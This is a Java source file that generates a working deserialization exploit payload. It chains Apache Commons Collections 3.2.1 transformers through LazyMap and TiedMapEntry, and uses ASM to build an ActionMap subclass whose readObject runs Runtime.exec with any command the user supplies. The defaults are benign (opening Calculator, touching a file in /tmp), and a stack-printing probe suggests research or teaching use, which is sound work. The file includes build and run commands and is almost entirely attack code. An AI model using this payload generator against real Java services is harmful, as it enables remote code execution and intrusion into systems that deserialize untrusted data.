/**
 * Generate ActionMap+TiedMapEntry gadget with reflection + ASM.
 *
 * Before Runtime.exec, the chain calls sast.gadget.StackProbe.printChain()
 * which prints the Java call stack (so Deserialize shows the gadget path).
 *
 * Writes:
 *   generated/sast/gadget/{DummyAction,ActionMapGadget,StackProbe}.class
 *   asm_actionmap.ser
 *
 *   javac -cp "commons-collections-3.2.1.jar:asm-9.7.jar" ActionMapAsmPayloadGen.java
 *   java --add-opens java.desktop/javax.swing=ALL-UNNAMED \
 *     -cp ".:commons-collections-3.2.1.jar:asm-9.7.jar" ActionMapAsmPayloadGen
 *   java -cp ".:generated:commons-collections-3.2.1.jar" Deserialize asm_actionmap.ser
 */
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.AbstractMap;
import java.util.HashMap;
import java.util.Map;
import javax.swing.Action;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

public class ActionMapAsmPayloadGen implements Opcodes {

    static final String DUMMY = "sast/gadget/DummyAction";
    static final String GADGET = "sast/gadget/ActionMapGadget";
    static final String PROBE = "sast/gadget/StackProbe";
    static final Path OUT_DIR = Path.of("generated");

    public static void main(String[] args) throws Exception {
        String cmd =
            args.length > 0
                ? args[0]
                : (System.getProperty("os.name", "").toLowerCase().contains("mac")
                    ? "open -a Calculator"
                    : "/usr/bin/touch /tmp/actionmap_gadget_ok.txt");
        Path ser = Path.of(args.length > 1 ? args[1] : "asm_actionmap.ser");

        byte[] dummyBytes = dumpDummyAction();
        byte[] gadgetBytes = dumpActionMapGadget();
        byte[] probeBytes = dumpStackProbe();
        writeClass(DUMMY, dummyBytes);
        writeClass(GADGET, gadgetBytes);
        writeClass(PROBE, probeBytes);
        System.out.println("[*] wrote generated classes under " + OUT_DIR.toAbsolutePath());

        ClassLoader cl =
            new ByteClassLoader(
                ActionMapAsmPayloadGen.class.getClassLoader(),
                Map.of(
                    DUMMY.replace('/', '.'), dummyBytes,
                    GADGET.replace('/', '.'), gadgetBytes,
                    PROBE.replace('/', '.'), probeBytes));

        Object payload = buildPayload(cl, cmd);
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.toFile()))) {
            oos.writeObject(payload);
        }
        System.out.println("[*] wrote " + ser.toAbsolutePath() + " cmd=" + cmd);
        System.out.println(
            "[*] deserialize (prints call stack then exec):\n"
                + "    java -cp \".:generated:commons-collections-3.2.1.jar\" Deserialize "
                + ser);
    }

    static Object buildPayload(ClassLoader cl, String command) throws Exception {
        Class<?> probeClz = cl.loadClass(PROBE.replace('/', '.'));

        // 1) StackProbe.printChain()  2) Runtime.exec(command)
        Transformer[] real =
            new Transformer[] {
                new ConstantTransformer(probeClz),
                new InvokerTransformer(
                    "getMethod",
                    new Class[] {String.class, Class[].class},
                    new Object[] {"printChain", new Class[0]}),
                new InvokerTransformer(
                    "invoke",
                    new Class[] {Object.class, Object[].class},
                    new Object[] {null, new Object[0]}),
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                    "getMethod",
                    new Class[] {String.class, Class[].class},
                    new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer(
                    "invoke",
                    new Class[] {Object.class, Object[].class},
                    new Object[] {null, new Object[0]}),
                new InvokerTransformer(
                    "exec", new Class[] {String.class}, new Object[] {command}),
                new ConstantTransformer(1),
            };

        ChainedTransformer chain =
            new ChainedTransformer(new Transformer[] {new ConstantTransformer(1)});
        Map lazy = LazyMap.decorate(new HashMap(), chain);
        TiedMapEntry entry = new TiedMapEntry(lazy, "trigger");
        Map.Entry<?, ?> probe = new AbstractMap.SimpleEntry<>("p", "v");

        Class<?> dummyClz = cl.loadClass(DUMMY.replace('/', '.'));
        Action action = (Action) dummyClz.getDeclaredConstructor().newInstance();

        setField(chain, "iTransformers", real);
        lazy.clear();

        Class<?> gadgetClz = cl.loadClass(GADGET.replace('/', '.'));
        Constructor<?> ctor =
            gadgetClz.getDeclaredConstructor(
                TiedMapEntry.class, Map.Entry.class, Action.class);
        ctor.setAccessible(true);
        Object gadget = ctor.newInstance(entry, probe, action);
        setField(gadget, "arrayTable", null);
        return gadget;
    }

    static void setField(Object obj, String name, Object value) throws Exception {
        Field f = null;
        for (Class<?> c = obj.getClass(); c != null; c = c.getSuperclass()) {
            try {
                f = c.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException ignored) {
            }
        }
        if (f == null) {
            throw new NoSuchFieldException(obj.getClass() + "#" + name);
        }
        f.setAccessible(true);
        f.set(obj, value);
    }

    static void writeClass(String internal, byte[] bytes) throws Exception {
        Path p = OUT_DIR.resolve(internal + ".class");
        Files.createDirectories(p.getParent());
        Files.write(p, bytes);
    }

    /** public static void printChain() — dump stack to stderr. */
    static byte[] dumpStackProbe() {
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        cw.visit(V1_8, ACC_PUBLIC | ACC_SUPER, PROBE, null, "java/lang/Object", null);
        cw.visitSource("StackProbe.java", null);

        MethodVisitor mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
        mv.visitCode();
        mv.visitVarInsn(ALOAD, 0);
        mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        mv.visitInsn(RETURN);
        mv.visitMaxs(0, 0);
        mv.visitEnd();

        mv = cw.visitMethod(ACC_PUBLIC | ACC_STATIC, "printChain", "()V", null, null);
        mv.visitCode();
        mv.visitFieldInsn(GETSTATIC, "java/lang/System", "err", "Ljava/io/PrintStream;");
        mv.visitLdcInsn("========== gadget call stack (before exec) ==========");
        mv.visitMethodInsn(
            INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);

        // Throwable t = new Throwable("ActionMap → TiedMapEntry → LazyMap → Invoker → exec");
        mv.visitTypeInsn(NEW, "java/lang/Throwable");
        mv.visitInsn(DUP);
        mv.visitLdcInsn("ActionMapGadget → TiedMapEntry#equals/getValue → LazyMap#get → transform → exec");
        mv.visitMethodInsn(
            INVOKESPECIAL, "java/lang/Throwable", "<init>", "(Ljava/lang/String;)V", false);
        mv.visitVarInsn(ASTORE, 0);

        mv.visitVarInsn(ALOAD, 0);
        mv.visitFieldInsn(GETSTATIC, "java/lang/System", "err", "Ljava/io/PrintStream;");
        mv.visitMethodInsn(
            INVOKEVIRTUAL, "java/lang/Throwable", "printStackTrace", "(Ljava/io/PrintStream;)V", false);

        mv.visitFieldInsn(GETSTATIC, "java/lang/System", "err", "Ljava/io/PrintStream;");
        mv.visitLdcInsn("======================================================");
        mv.visitMethodInsn(
            INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
        mv.visitInsn(RETURN);
        mv.visitMaxs(0, 0);
        mv.visitEnd();

        cw.visitEnd();
        return cw.toByteArray();
    }

    static byte[] dumpDummyAction() {
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        cw.visit(V1_8, ACC_PUBLIC | ACC_SUPER, DUMMY, null, "javax/swing/AbstractAction", null);
        cw.visitField(ACC_PRIVATE | ACC_STATIC | ACC_FINAL, "serialVersionUID", "J", null, 1L)
            .visitEnd();

        MethodVisitor mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
        mv.visitCode();
        mv.visitVarInsn(ALOAD, 0);
        mv.visitMethodInsn(INVOKESPECIAL, "javax/swing/AbstractAction", "<init>", "()V", false);
        mv.visitInsn(RETURN);
        mv.visitMaxs(0, 0);
        mv.visitEnd();

        mv =
            cw.visitMethod(
                ACC_PUBLIC, "actionPerformed", "(Ljava/awt/event/ActionEvent;)V", null, null);
        mv.visitCode();
        mv.visitInsn(RETURN);
        mv.visitMaxs(0, 0);
        mv.visitEnd();
        cw.visitEnd();
        return cw.toByteArray();
    }

    static byte[] dumpActionMapGadget() {
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        cw.visit(V1_8, ACC_PUBLIC | ACC_SUPER, GADGET, null, "javax/swing/ActionMap", null);
        cw.visitField(ACC_PRIVATE | ACC_STATIC | ACC_FINAL, "serialVersionUID", "J", null, 1L)
            .visitEnd();
        cw.visitField(
                ACC_PRIVATE,
                "entry",
                "Lorg/apache/commons/collections/keyvalue/TiedMapEntry;",
                null,
                null)
            .visitEnd();
        cw.visitField(ACC_PRIVATE, "probe", "Ljava/util/Map$Entry;", null, null).visitEnd();
        cw.visitField(ACC_PRIVATE, "action", "Ljavax/swing/Action;", null, null).visitEnd();

        MethodVisitor mv =
            cw.visitMethod(
                ACC_PUBLIC,
                "<init>",
                "(Lorg/apache/commons/collections/keyvalue/TiedMapEntry;Ljava/util/Map$Entry;Ljavax/swing/Action;)V",
                null,
                null);
        mv.visitCode();
        mv.visitVarInsn(ALOAD, 0);
        mv.visitMethodInsn(INVOKESPECIAL, "javax/swing/ActionMap", "<init>", "()V", false);
        mv.visitVarInsn(ALOAD, 0);
        mv.visitVarInsn(ALOAD, 1);
        mv.visitFieldInsn(
            PUTFIELD, GADGET, "entry", "Lorg/apache/commons/collections/keyvalue/TiedMapEntry;");
        mv.visitVarInsn(ALOAD, 0);
        mv.visitVarInsn(ALOAD, 2);
        mv.visitFieldInsn(PUTFIELD, GADGET, "probe", "Ljava/util/Map$Entry;");
        mv.visitVarInsn(ALOAD, 0);
        mv.visitVarInsn(ALOAD, 3);
        mv.visitFieldInsn(PUTFIELD, GADGET, "action", "Ljavax/swing/Action;");
        mv.visitInsn(RETURN);
        mv.visitMaxs(0, 0);
        mv.visitEnd();

        mv =
            cw.visitMethod(
                ACC_PRIVATE,
                "writeObject",
                "(Ljava/io/ObjectOutputStream;)V",
                null,
                new String[] {"java/io/IOException"});
        mv.visitCode();
        mv.visitVarInsn(ALOAD, 1);
        mv.visitMethodInsn(
            INVOKEVIRTUAL, "java/io/ObjectOutputStream", "defaultWriteObject", "()V", false);
        mv.visitInsn(RETURN);
        mv.visitMaxs(0, 0);
        mv.visitEnd();

        mv =
            cw.visitMethod(
                ACC_PRIVATE,
                "readObject",
                "(Ljava/io/ObjectInputStream;)V",
                null,
                new String[] {"java/io/IOException", "java/lang/ClassNotFoundException"});
        mv.visitCode();
        mv.visitVarInsn(ALOAD, 1);
        mv.visitMethodInsn(
            INVOKEVIRTUAL, "java/io/ObjectInputStream", "defaultReadObject", "()V", false);

        mv.visitVarInsn(ALOAD, 0);
        mv.visitVarInsn(ALOAD, 0);
        mv.visitFieldInsn(
            GETFIELD, GADGET, "entry", "Lorg/apache/commons/collections/keyvalue/TiedMapEntry;");
        mv.visitVarInsn(ALOAD, 0);
        mv.visitFieldInsn(GETFIELD, GADGET, "action", "Ljavax/swing/Action;");
        mv.visitMethodInsn(
            INVOKEVIRTUAL,
            "javax/swing/ActionMap",
            "put",
            "(Ljava/lang/Object;Ljavax/swing/Action;)V",
            false);

        mv.visitVarInsn(ALOAD, 0);
        mv.visitVarInsn(ALOAD, 0);
        mv.visitFieldInsn(GETFIELD, GADGET, "probe", "Ljava/util/Map$Entry;");
        mv.visitVarInsn(ALOAD, 0);
        mv.visitFieldInsn(GETFIELD, GADGET, "action", "Ljavax/swing/Action;");
        mv.visitMethodInsn(
            INVOKEVIRTUAL,
            "javax/swing/ActionMap",
            "put",
            "(Ljava/lang/Object;Ljavax/swing/Action;)V",
            false);
        mv.visitInsn(RETURN);
        mv.visitMaxs(0, 0);
        mv.visitEnd();

        cw.visitEnd();
        return cw.toByteArray();
    }

    static final class ByteClassLoader extends ClassLoader {
        private final Map<String, byte[]> defs;

        ByteClassLoader(ClassLoader parent, Map<String, byte[]> defs) {
            super(parent);
            this.defs = defs;
        }

        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            byte[] b = defs.get(name);
            if (b == null) {
                throw new ClassNotFoundException(name);
            }
            return defineClass(name, b, 0, b.length);
        }
    }
}
